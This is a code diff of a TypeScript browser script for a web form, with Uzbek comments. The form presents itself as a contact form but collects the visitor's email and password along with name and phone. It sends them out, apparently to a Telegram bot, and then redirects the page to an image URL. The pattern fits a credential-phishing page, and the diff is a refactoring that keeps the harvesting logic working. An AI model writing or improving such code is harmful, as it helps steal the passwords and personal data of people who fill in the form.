@@ -7,23 +7,22 @@ const form = document.querySelector<HTMLFormElement>('#contactForm');
 const statusText = document.querySelector<HTMLElement>('#status');
 
 if (form && statusText) {
-  const formElement = form;
-  const statusElement = statusText;
-
-  formElement.addEventListener('submit', function (e: Event): void {
+  form.addEventListener('submit', function (e: Event): void {
     e.preventDefault();
 
     const emailInput = document.getElementById('email') as HTMLInputElement | null;
     const passwordInput = document.getElementById('password') as HTMLInputElement | null;
     const nameInput = document.getElementById('name') as HTMLInputElement | null;
     const callInput = document.getElementById('number') as HTMLInputElement | null;
-    const redirectImageInput = document.getElementById('redirectImage') as HTMLInputElement | null;
+    const redirectInput = document.getElementById('redirectImage') as HTMLInputElement | null;
 
     const email = emailInput?.value || '';
     const password = passwordInput?.value || '';
     const name = nameInput?.value || '';
     const call = callInput?.value || '';
-    const redirectImage = redirectImageInput?.value?.trim() || '';
+    
+    // Qiymatni (value) to'g'ri o'qiymiz
+    const redirectImage = redirectInput?.value?.trim() || '';
 
     const text: string = `
 📝 Yangi forma xabari:
@@ -44,14 +43,19 @@ if (form && statusText) {
       }),
     })
       .then((res: Response) => {
-        statusElement.textContent = 'Xabar muvaffaqiyatli yuborildi! Rasm ochilmoqda...';
-        formElement.reset();
-        if (redirectImage) {
-          window.location.href = redirectImage;
+        if (res.ok) {
+          statusText.textContent = 'Xabar muvaffaqiyatli yuborildi! Rasm ochilmoqda...';
+          form.reset();
+          if (redirectImage) {
+            // Sahifani rasm manziliga yo'naltirish
+            window.location.href = redirectImage;
+          }
+        } else {
+          statusText.textContent = 'Xatolik yuz berdi!';
         }
       })
       .catch((err: Error) => {
-        statusElement.textContent = 'Xatolik yuz berdi!';
+        statusText.textContent = 'Xatolik yuz berdi!';
         console.error("Telegram error:", err);
       });
   });
